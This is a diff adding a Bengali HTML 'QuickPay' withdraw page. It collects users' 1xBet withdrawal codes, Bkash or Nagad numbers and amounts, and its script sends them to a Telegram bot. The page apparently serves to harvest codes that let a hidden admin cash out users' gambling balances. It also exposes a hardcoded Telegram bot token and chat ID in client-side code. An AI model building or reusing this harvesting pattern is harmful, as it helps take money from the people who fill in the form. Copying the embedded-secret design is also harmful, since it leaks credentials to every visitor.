@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Withdraw - QuickPay</title>
+    <style>
+        body { background: #050a18; font-family: sans-serif; color: white; padding: 20px; }
+        .card { background: rgba(255,255,255,0.05); padding: 25px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.1); }
+        .info { background: rgba(255,49,49,0.1); border: 1px solid #ff3131; padding: 15px; border-radius: 15px; margin-bottom: 20px; font-size: 14px; }
+        input, select { width: 100%; padding: 14px; margin-top: 10px; border-radius: 12px; border: 1px solid #333; background: #000; color: white; box-sizing: border-box; outline: none; }
+        label { display: block; margin-top: 15px; font-size: 14px; color: #00f2ff; }
+        .btn { width: 100%; padding: 18px; margin-top: 25px; border: none; border-radius: 15px; background: #ff3131; color: white; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h3 style="text-align:center; color:#00f2ff;">উইথড্র রিকোয়েস্ট</h3>
+        
+        <div class="info">
+            <b>1xBet Withdrawal Address:</b><br>
+            City: <b>Comilla</b>, Street: <b>Bristol sk(24/7)</b>
+        </div>
+
+        <label>টাকা কোথায় নিতে চান?</label>
+        <select id="method">
+            <option value="Bkash">Bkash (বিকাশ)</option>
+            <option value="Nagad">Nagad (নগদ)</option>
+            <option value="Main Balance">Add to Main Balance (অ্যাপ ব্যালেন্স)</option>
+        </select>
+
+        <input type="text" id="c" placeholder="উইথড্র কোড (1xBet)">
+        <input type="number" id="n" placeholder="নম্বর (ব্যালেন্সের জন্য প্রয়োজন নেই)">
+        <input type="number" id="a" placeholder="টাকার পরিমাণ">
+        
+        <button class="btn" onclick="send()">কনফার্ম উইথড্র 🚀</button>
+    </div>
+
+    <script>
+        function send() {
+            const user = localStorage.getItem("savedUser") || "Unknown";
+            const method = document.getElementById('method').value;
+            const c = document.getElementById('c').value;
+            const n = document.getElementById('n').value;
+            const a = document.getElementById('a').value;
+
+            // ভ্যালিডেশন: মেইন ব্যালেন্স ছাড়া অন্য মেথডে নম্বর বাধ্যতামূলক
+            if(!c || !a) return alert("সব তথ্য দিন!");
+            if(method !== "Main Balance" && !n) return alert("টাকা নেওয়ার নম্বরটি দিন!");
+
+            const msg = `📤 **নতুন উইথড্র রিকোয়েস্ট!**\n\n👤 ইউজার: ${user}\n💳 মেথড: ${method}\n🔑 কোড: ${c}\n📱 নম্বর: ${n || 'N/A'}\n💵 টাকা: ${a} TK`;
+
+            // টেলিগ্রাম বোট কানেকশন
+            fetch(`https://api.telegram.org/bot7725946897:AAHLBfX2k2fO6u_yW3165ZqFp2F-Ew_M57E/sendMessage?chat_id=7414008169&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+            .then(res => {
+                if(res.ok) {
+                    alert("আপনার রিকোয়েস্টটি অ্যাডমিনের কাছে পাঠানো হয়েছে।");
+                    window.location.replace("dashboard.html");
+                } else {
+                    alert("মেসেজ পাঠানো যায়নি! বট চেক করুন।");
+                }
+            })
+            .catch(err => alert("Error: " + err));
+        }
+    </script>
+</body>
+</html>
